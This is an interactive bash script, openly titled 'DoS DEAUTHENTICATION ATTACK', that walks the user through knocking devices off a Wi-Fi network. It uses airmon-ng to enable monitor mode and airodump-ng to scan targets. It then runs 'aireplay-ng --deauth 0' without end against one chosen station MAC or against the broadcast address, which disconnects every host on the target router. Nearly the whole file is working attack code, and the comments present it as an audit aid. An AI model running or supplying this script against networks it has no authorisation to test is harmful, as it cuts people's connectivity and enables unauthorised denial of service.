#!/bin/bash

#How to: https://hackernoon.com/forcing-a-device-to-disconnect-from-wifi-using-a-deauthentication-attack-f664b9940142
#OUI lookup: https://hwaddress.com/?q=38%3A78%3A62

#---------------------------------------------- VARIABLES ----------------------------------------------
#Here are some variable for the text format. These variables uses escape sequences (control sequences for ANSI/VT100)
#In linux the escape sequences are \e, \033, \x1B
BLINK="\e[5m"
BOLD="\e[1m"
UNDERLINED="\e[4m"
INVERT="\e[7m"
HIDE="\e[8m"

RED="\e[31m"
BLUE="\e[34m"
BLACK="\e[40m"
WHITE="\e[37m"
CYAN="\e[36m"
LIGHTYELLOW="\e[1;33m"

UNDERRED="\e[41m"
UNDERGREEN="\e[42m"

#Obv we need a control sequence that closes the rest control sequences
END="\e[0m"

#---------------------------------------------- FUNCTIONS ----------------------------------------------
#Function for wait 12 seconds
waitFunction()
{
	#Hide the cursor to view the waiting bar without the backgorund color of the cursor
	tput civis

	#Bucle that repeats 3 times
	for count in [ 0..3 ];
	do
		#Print compatible with format (-e) and without new line (-n).
		#With the \\r (\r carriage return) we erase the first char of the line,
		#so we can write another character in the same line without the prev char.
		echo -ne "| \\r"
		sleep 1
		echo -ne "/ \\r"
		sleep 1
		echo -ne "- \\r"
		sleep 1
		echo -ne "\ \\r"
		sleep 1
	done

	#Show again the cursor.
	tput cvvis
}

#Function to show when we are making an attack
initFunction()
{
	#Bucle that repeats 7 times
	for count in [ 0..7 ];
	do
		#We use carriage return for the same reason in the waitFunction.
		#Also, we add blue color and bold (see below).
		echo -ne $BLUE$BOLD"Initiating attack\\r"$END$END
		sleep 0.1
		echo -ne $BLUE$BOLD"iNitiating attack\\r"$END$END
		sleep 0.1
		echo -ne $BLUE$BOLD"inItiating attack\\r"$END$END
		sleep 0.1
		echo -ne $BLUE$BOLD"iniTiating attack\\r"$END$END
		sleep 0.1
		echo -ne $BLUE$BOLD"initIating attack\\r"$END$END
		sleep 0.1
		echo -ne $BLUE$BOLD"initiAting attack\\r"$END$END
		sleep 0.1
		echo -ne $BLUE$BOLD"initiaTing attack\\r"$END$END
		sleep 0.1
		echo -ne $BLUE$BOLD"initiatIng attack\\r"$END$END
		sleep 0.1
		echo -ne $BLUE$BOLD"initiatiNg attack\\r"$END$END
		sleep 0.1
		echo -ne $BLUE$BOLD"initiatinG attack\\r"$END$END
		sleep 0.1
		echo -ne $BLUE$BOLD"initiating Attack\\r"$END$END
		sleep 0.1
		echo -ne $BLUE$BOLD"initiating aTtack\\r"$END$END
		sleep 0.1
		echo -ne $BLUE$BOLD"initiating atTack\\r"$END$END
		sleep 0.1
		echo -ne $BLUE$BOLD"initiating attAck\\r"$END$END
		sleep 0.1
		echo -ne $BLUE$BOLD"initiating attaCk\\r"$END$END
		sleep 0.1
		echo -ne $BLUE$BOLD"initiating attacK\\r"$END$END
		sleep 0.1
	done
}

#Function to open new terminal windows depending of the desktop manager installed.
#KDE and XFCE works well for this script. Gnome and LXDE probably not...
newTerminal()
{
	#In these variable we save the location of the terminals for each desktop enviroments.
	kde=`which konsole`
	xfce=`which xfce4-terminal`
	gnome=`which gnome-terminal`

	#If konsole (for kde plasma) is founded...
	if [[ $kde == '/usr/bin/konsole' ]];
	then
		#Open konsole without closing it with a specific height (avoid the window is hidden
		#by the background instruction in the final), width and position. Then execute (-e)
		#the command given in the argument $1. The output is discarded and finally, we execute it
		#in background so the program can continue independently the new terminal.
		konsole --noclose --geometry 700x400+0+0 -e $1 2> /dev/null &

	#If xfce4-terminal (for xfce) is founded...
	elif [[ $xfce == '/usr/bin/xfce4-terminal' ]];
	then
		#Will do the same as above but with the specific sintaxis for xfce
		xfce4-terminal --hold --geometry=700x400+0+0 -e="$1" 2> /dev/null &

	#If gnome-terminal (for gnome) is founded... (BETA xd)
	elif [[ $gnome == '/usr/bin/gnome-terminal(BETA)' ]]; #Delete (BETA) to enter in the elif condition
	then
		#Will do the same as above but with the specific sintaxis for gnome. Gnome It doesnt work
		#well for this application. Cant execute commands and not have a hold/no close option for
		#avoid the close of the window by the background instruction
		gnome-terminal --geometry=700x400+0+0 --command $1 2> /dev/null #&
		echo -e $RED"It seems like gnome-terminal have problems with --command option :/"$END

	#If lxterminal (for lxde) is founded... (BETA xd)
	elif [[ $lxde == '/usr/bin/lxterminal(BETA)' ]]; #Delete (BETA) to enter in the elif condition
	then
		#Will do the same as above but with the specific sintaxis for gnome. As gnome, it doesnt
		#work well because it doesnt have hold/no close option.
		lxterminal --geometry=90x30 --e $1 2> /dev/null #&

	#But if no desktop manager is founded...
	else
		#Show the commands the user need to input in a new terminal
		echo ""
		echo -e "No compatible desktop enviroment founded: KDE, XFCE, Gnome ("$LIGHTYELLOW"BETA"$END"), LXDE ("$LIGHTYELLOW"BETA"$END")"
		echo "My recommendation is to install the xfce4-terminal (I will install only the WM terminal, not the entire xfce4 desktop environment, I promise). Do you want?"
		echo ""
		read -p "[ y/n ]: " install_response
		echo ""

		#If the response for the install is yes...
		if [[ $install_response == 'y' || $install_response == 'Y' ]];
		then
			echo "Ok, this takes a few time, hold on :)"
			echo ""

			#...installs only xfce4-terminal, no the entire desktop enviroment.
			sudo apt-get install xfce4-terminal 2> /dev/null

			echo ""
			echo ""
			echo "All ready, rerun this script :p"

			#Exits the script for rerun it
			exit 0

		#But if the user tells no or whatever...
		else
			#...only prints the command that the user need to type it manually in another terminal.
			echo -e "Mh... Ok... Then please, open a new terminal and enter this -> " $CYAN$1$END

			#And the script continues running normally.
		fi
	fi
}

#---------------------------------------------- PROGRAM ----------------------------------------------
#Lets start with the script!

#Clear the terminal
clear

#Print the instructions
echo -e $RED"------------------------ DoS DEAUTHENTICATION ATTACK ------------------------"$END
echo -e $BLUE$BOLD"1)"$END$END "Type the interface you want to user for monitoring with air-crack:"
#Extract the available wireless interfaces
winterfaces=`ip addr | grep -o wlan. | uniq`
echo "Interfaces available:"
echo -e $RED$BOLD$winterfaces$END$END
echo ""
#Read what user inputs and save it in the variable interface
read -p "Interface: " interface

#Start the interface selected as monitoring interface. The output is discarded
airmon-ng start $interface > /dev/null

#Open firefox with a OUI lookup webpage in backgroud to continue with the scrip
#firefox https://hwaddress.com/?q=38%3A78%3A62 &

#Saves the new monitor interface in the variable moninterface. The print the new monitor interface with blinking
echo ""
moninterface=`ip addr | grep -o wlan.m.. | uniq`
echo -e $RED"New monitor interface -> " $BLINK$moninterface$END$END


#konsole --geometry 700x400+0+0 -e airodump-ng --update 12 $moninterface 2> /dev/null &
#Passes to the function the argument (the command we wil execute in the new terminal)
newTerminal "airodump-ng --update 12 $moninterface"

#Calls the waitFunction to wait until the scan is ready
waitFunction

#Erase the last character of the waitFunction and then go to the next line
echo -ne " \\r\n"
#Prints the second instruction
echo -e $BLUE$BOLD"2)"$END$END "Type the MAC and the channel that appears in the new window of the router where you want to scan for hosts. To know at which device correspond a MAC address, visit "$UNDERLINED"https://hwaddress.com/?q=38%3A78%3A62"$END " (OUI lookup web) and search the 6 first hexadecimal digits (XX:XX:XX). This digits corresponds to the maker of the network card."
echo ""
#Read the MAC and the cahnnel that the user want to AUDIT
read -p "Router MAC address (BSSID): " routermac
read -p "Channel (CH): " channel

#Prints the configuration with blinking
echo ""
echo -e $RED"MAC of the target router -> " $BLINK$routermac$END$END
echo -e $RED"Channel of the target router -> " $BLINK$channel$END$END

#Now stop de monitoring interface and discard the output.
airmon-ng stop $moninterface > /dev/null
#Inmediatly, start another time the interface as monitoring but in the same channel that is the router tou audit.
#If the interface is not in the same channel as the router, the interface cant inject packets properly
airmon-ng start $interface $channel > /dev/null

#konsole --geometry 700x400+0+0 -e airodump-ng wlan1mon --update 12 --bssid $routermac --channel $channel 2> /dev/null &
#Passes to the function the argument (the command we wil execute in the new terminal)
newTerminal "airodump-ng $moninterface --update 12 --bssid $routermac --channel $channel"

#Calls the wait function.
waitFunction
#Erase the last character of the waitFunction and then go to the next line
echo -ne " \\r\n"
#Prints the third instruction
echo -e $BLUE$BOLD"3)"$END$END "Finally type the MAC of the device that you want to kick out of the wireless network. As the same, you can know at which device correspond a MAC address using OUI lookup."
echo "Press Enter to inject deauth packets to de broadcast MAC (FF:FF:FF:FF:FF:FF). This affects to all hosts connected to the network."
echo ""

#Initialise an infinite bucle
while true;
do
	#Saves the input (MAC of the host victim) in the variable victimmac
	read -p "Target MAC address (STATION): " victimmac
	echo ""

	#If the variable is empty (user press enter)...
	if [[ $victimmac == '' ]];
	then
		#Print that the attack is going to be done against all hosts.
		echo -e $RED"Target to kick out -> " $BLINK"All devices (FF:FF:FF:FF:FF:FF)"$END$END

	else
		#Print that the attack is going to be done against the specified MAC.
		echo -e $RED"Target to kick out -> " $BLINK$victimmac$END$END
	fi

	#Calls the function initFunction to warn the user that the attack is initialising
	echo ""
	initFunction
	#Erase the characters left behind by the init function
	echo -ne "                         \\r"

	#If there is no MAC specified for the attack
	if [[ $victimmac == '' ]];
	then
		#Inject infinite deauth packets (--deauth 0) to disconnect all hosts (-c FF:FF:FF:FF:FF:FF) in the router
		#specified (-a $routermac) using the monitoring interface ($moninterface)
		newTerminal "aireplay-ng --deauth 0 -c FF:FF:FF:FF:FF:FF -a $routermac $moninterface"

		#This do the same but without the function newTerminal
#		konsole --noclose --geometry 700x270+1080+0 -e aireplay-ng --deauth 0 -c FF:FF:FF:FF:FF:FF -a $routermac $moninterface 2> /dev/null &
		#And this make the attack without a new terminal
#		aireplay-ng --deauth 0 -c FF:FF:FF:FF:FF:FF -a $routermac $moninterface

	#But if there is a MAC in the variable...
	else
		#Inject infinite deauth packets (--deauth 0) to disconnect the specified MAC (-c $victimmac) in the router
		#specified (-a $routermac) using the monitoring interface ($moninterface)
		newTerminal "aireplay-ng --deauth 0 -c $victimmac -a $routermac $moninterface"

		#This do the same but without the function newTerminal
#		konsole --noclose --geometry 700x270+1080+0 -e aireplay-ng --deauth 0 -c $victimmac -a $routermac $moninterface 2> /dev/null
		#And this make the attack without a new terminal
#		aireplay-ng --deauth 0 -c $victimmac -a $routermac $moninterface
	fi

	#When the attack is finished (canceled by the user), asks the user if want to make another attack to other MAC address associated in the same
	#wireless network
	echo ""
	echo -e $BLUE$BOLD"4)"$END$END "You want to make another deauth attack to another host in the same network? Press y (yes) or any key followed by enter to accept, or n followed by enter to exit the program."
	#Saves the response of the user in the variable anotherattack
	echo ""
	read -p "[ y/n ]: " anotherattack
	echo ""

	#This is like an if sentence...
	#Read the content of the variable
	case $anotherattack in
		#If the content is yes (y)
		"y")
			#Do nothing. Continues with the infinite loop
			;;
		#If is no (n)
		"n")
			#Break the bucle (the program is finishing)
			break
			;;
		#If is any other char or string
		*)
			#Acts like the response it was like yes
			;;
	esac
done

#Print that the monitoring interface is going to stop beeing a monitoring interface and then stops the monitoring interface. The
#output is discarded
echo "Stoping $interface as monitoring interface..."
airmon-ng stop $moninterface > /dev/null
#Finished!
echo "That's all :)"
